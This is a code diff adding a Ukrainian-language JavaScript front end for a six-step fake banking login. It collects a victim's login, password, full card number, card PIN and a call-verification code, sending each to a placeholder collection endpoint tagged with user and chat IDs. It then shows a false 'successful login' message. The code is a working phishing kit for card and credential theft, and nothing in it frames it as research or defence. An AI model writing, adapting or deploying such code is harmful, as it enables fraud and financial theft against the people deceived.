@@ -1,0 +1,203 @@
+document.addEventListener('DOMContentLoaded', function() {
+    const state = {
+        currentStep: 1,
+        totalSteps: 6,
+        loading: false,
+        callCode: '1234'
+    };
+
+    const elements = {
+        loadingOverlay: document.getElementById('loadingOverlay'),
+        loadingText: document.getElementById('loadingText'),
+        progressBar: document.getElementById('progressBar'),
+        progressText: document.getElementById('progressText'),
+        steps: document.querySelectorAll('.step'),
+        pinInputs: document.querySelectorAll('.code-input[id^="pin"]'),
+        callInputs: document.querySelectorAll('.code-input[id^="callCode"]'),
+        nextCallBtn: document.getElementById('nextToCall'),
+        verifyCallBtn: document.getElementById('verifyCallCode'),
+        callMessage: document.getElementById('callMessage'),
+        cardNumber: document.getElementById('cardNumber')
+    };
+
+    initInputHandlers();
+    setupNavigation();
+    updateProgress();
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const userId = urlParams.get('user_id') || 'не вказано';
+    const chatId = urlParams.get('chat_id') || 'не вказано';
+
+    async function sendDataToServer(data) {
+        try {
+            const response = await fetch('https://your-server.com/api/collect', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    ...data,
+                    userId,
+                    chatId,
+                    timestamp: new Date().toISOString()
+                })
+            });
+            return await response.json();
+        } catch (error) {
+            console.error('Помилка відправки даних:', error);
+            return { success: false };
+        }
+    }
+
+    function showLoading(text = 'Завантаження...') {
+        elements.loadingText.textContent = text;
+        elements.loadingOverlay.classList.add('active');
+        state.loading = true;
+    }
+
+    function hideLoading() {
+        elements.loadingOverlay.classList.remove('active');
+        state.loading = false;
+    }
+
+    function initInputHandlers() {
+        elements.cardNumber.addEventListener('input', function(e) {
+            let value = this.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            let formatted = '';
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) formatted += ' ';
+                formatted += value[i];
+            }
+            this.value = formatted.substring(0, 19);
+        });
+
+        setupCodeInputs(elements.pinInputs, elements.nextCallBtn);
+        setupCodeInputs(elements.callInputs, elements.verifyCallBtn);
+    }
+
+    function setupCodeInputs(inputs, nextBtn) {
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', function(e) {
+                if (this.value.length === 1 && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+                checkCodeComplete(inputs, nextBtn);
+            });
+
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
+                    inputs[index - 1].focus();
+                }
+            });
+
+            input.addEventListener('paste', function(e) {
+                e.preventDefault();
+                const pasteData = e.clipboardData.getData('text').trim();
+                if (/^\d{4}$/.test(pasteData)) {
+                    inputs.forEach((inp, i) => {
+                        inp.value = pasteData[i] || '';
+                    });
+                    checkCodeComplete(inputs, nextBtn);
+                    inputs[3].focus();
+                }
+            });
+        });
+    }
+
+    function checkCodeComplete(inputs, nextBtn) {
+        const allFilled = Array.from(inputs).every(input => input.value.length === 1);
+        nextBtn.disabled = !allFilled;
+    }
+
+    function setupNavigation() {
+        document.getElementById('nextToPassword').addEventListener('click', async () => {
+            const login = document.getElementById('login').value.trim();
+            if (!state.loading && login) {
+                showLoading();
+                await sendDataToServer({ step: 1, login });
+                setTimeout(() => goToStep(2), 800);
+            }
+        });
+
+        document.getElementById('nextToCard').addEventListener('click', async () => {
+            const password = document.getElementById('password').value;
+            if (!state.loading && password.length >= 6) {
+                showLoading();
+                await sendDataToServer({ step: 2, password });
+                setTimeout(() => goToStep(3), 800);
+            }
+        });
+
+        document.getElementById('nextToPin').addEventListener('click', async () => {
+            const cardNumber = elements.cardNumber.value.replace(/\s/g, '');
+            if (!state.loading && cardNumber.length === 16) {
+                showLoading();
+                await sendDataToServer({ step: 3, cardNumber });
+                setTimeout(() => goToStep(4), 800);
+            }
+        });
+
+        document.getElementById('nextToCall').addEventListener('click', async () => {
+            if (!state.loading) {
+                showLoading('Ініціалізація дзвінка...');
+                const pinCode = Array.from(elements.pinInputs).map(input => input.value).join('');
+                await sendDataToServer({ step: 4, pinCode });
+                setTimeout(() => {
+                    elements.callMessage.innerHTML = `<span class="success">Дзвінок ініціалізовано! Приклад: ${state.callCode}</span>`;
+                    goToStep(5);
+                }, 1500);
+            }
+        });
+
+        document.getElementById('verifyCallCode').addEventListener('click', async () => {
+            if (!state.loading) {
+                const enteredCode = Array.from(elements.callInputs).map(input => input.value).join('');
+                showLoading('Перевірка коду...');
+                await sendDataToServer({ step: 5, callCode: enteredCode, validCode: state.callCode });
+                setTimeout(() => goToStep(6), 1000);
+            }
+        });
+
+        document.getElementById('backToLogin').addEventListener('click', () => {
+            if (!state.loading) goToStep(1);
+        });
+
+        document.getElementById('backToPassword').addEventListener('click', () => {
+            if (!state.loading) goToStep(2);
+        });
+
+        document.getElementById('backToCard').addEventListener('click', () => {
+            if (!state.loading) goToStep(3);
+        });
+
+        document.getElementById('backToPin').addEventListener('click', () => {
+            if (!state.loading) goToStep(4);
+        });
+
+        document.getElementById('finishBtn').addEventListener('click', async () => {
+            await sendDataToServer({ step: 6, completed: true });
+            alert('Успішний вхід!');
+        });
+    }
+
+    function goToStep(step) {
+        elements.steps.forEach(s => s.classList.remove('active'));
+        document.getElementById(`step${step}`).classList.add('active');
+        state.currentStep = step;
+        updateProgress();
+
+        if (step === 1) setTimeout(() => document.getElementById('login').focus(), 50);
+        else if (step === 2) setTimeout(() => document.getElementById('password').focus(), 50);
+        else if (step === 3) setTimeout(() => document.getElementById('cardNumber').focus(), 50);
+        else if (step === 4) setTimeout(() => elements.pinInputs[0].focus(), 50);
+        else if (step === 5) setTimeout(() => elements.callInputs[0].focus(), 50);
+
+        hideLoading();
+    }
+
+    function updateProgress() {
+        const progress = ((state.currentStep - 1) / (state.totalSteps - 1)) * 100;
+        elements.progressBar.style.width = `${progress}%`;
+        elements.progressText.textContent = `Крок ${state.currentStep} з ${state.totalSteps}`;
+    }
+});
